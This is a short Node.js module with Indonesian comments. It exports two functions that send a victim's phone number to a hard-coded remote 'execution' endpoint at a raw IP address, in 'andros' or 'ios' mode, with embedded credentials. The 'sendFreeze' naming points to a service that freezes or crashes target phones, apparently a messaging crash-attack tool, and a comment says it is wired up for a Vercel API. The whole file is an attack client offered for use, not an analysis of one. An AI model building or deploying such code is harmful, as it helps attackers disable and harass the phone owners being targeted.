const axios = require("axios");

async function sendFreezeAndros(targetNumber) {
  try {
    const res = await axios.get(`http://170.64.191.203:1900/execution?target=${targetNumber}&mode=andros&username=Axora&key=EA24`);
    console.log("✅ ANDROS:", res.data);
  } catch (err) {
    console.error("❌ Gagal Andros:", err.response?.data || err.message);
  }
}

async function sendFreezeIOS(targetNumber) {
  try {
    const res = await axios.get(`http://170.64.191.203:1900/execution?target=${targetNumber}&mode=ios&username=Axora&key=EA24`);
    console.log("✅ IOS:", res.data);
  } catch (err) {
    console.error("❌ Gagal IOS:", err.response?.data || err.message);
  }
}

// Export agar bisa dipanggil oleh Vercel API
module.exports = { sendFreezeAndros, sendFreezeIOS };
